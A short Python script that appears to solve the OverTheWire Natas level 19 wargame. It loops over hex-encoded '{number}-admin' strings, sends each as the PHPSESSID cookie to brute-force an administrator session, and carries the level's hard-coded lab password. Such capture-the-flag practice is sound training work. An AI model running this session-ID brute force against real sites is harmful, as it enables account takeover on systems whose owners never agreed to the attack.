#!/usr/bin/env python

import requests
import re
import codecs
import binascii


username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = f'http://{username}.natas.labs.overthewire.org/'


session = requests.Session()
# # response = session.get(url, auth=(username, password))
# response = session.post(
#     url, data={'username': '', 'password': ''}, auth=(username, password))

# content = response.text
# # output = open('output.html', 'w')
# # output.write(content)

# print(content)
# print(codecs.decode(session.cookies['PHPSESSID'], 'hex'))


for i in range(641):
    session = requests.Session()
    # response = session.get(url, auth=(username, password))
    # response = session.post(
    #     url, data={'username': '', 'password': ''}, auth=(username, password))
    session_id = (f'{i}-admin').encode("utf-8").hex()


    response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password))

    content = response.text
    # output = open('output.html', 'w')
    # output.write(content)

    # print(content)
    # print(session_id)

    if( "You are an admin" in content):
        print('You got it', i)
        print(content)
    else:
        print('Still trying', i)

# PHPSESSID session.cookies